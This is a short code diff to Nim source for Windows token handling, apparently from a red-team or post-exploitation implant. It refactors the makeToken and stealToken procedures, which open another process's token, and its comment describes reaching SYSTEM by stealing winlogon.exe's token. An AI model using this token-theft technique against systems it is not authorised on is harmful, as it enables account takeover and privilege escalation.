@@ -307,8 +307,6 @@ proc makeToken*(username, password, domain: string, logonType: DWORD = LOGON32_L
     if LogonUserA(username, domain, password, logonType, provider, addr hToken) == FALSE:
         raise newException(CatchableError, GetLastError().getError())
 
-    impersonate(hToken, apis)
-
     return hToken
 
 proc enablePrivilege*(privilegeName: string, enable: bool = true): string = 
@@ -340,7 +338,7 @@ proc enablePrivilege*(privilegeName: string, enable: bool = true): string =
     return fmt"{action} {privilegeToString(addr luid)}."
 
 #[
-    Steal the access token of a remote process and impersonate it
+    Steal the access token of a remote process 
     This requires SYSTEM privileges to work reliably. Even running as a regular Administrator user might not be sufficient to steal access tokens of other processes
     A work-around is to impersonate NT AUTHORITY\SYSTEM first by stealing the token of a process like winlogon.exe, and then using this token to steal other user's tokens 
 ]#
@@ -372,7 +370,5 @@ proc stealToken*(pid: int): HANDLE =
     status = apis.NtOpenProcessToken(hProcess, TOKEN_DUPLICATE or TOKEN_ASSIGN_PRIMARY or TOKEN_QUERY, addr hToken)
     if status != STATUS_SUCCESS:
         raise newException(CatchableError, status.getNtError())
-
-    impersonate(hToken, apis)
 
     return hToken
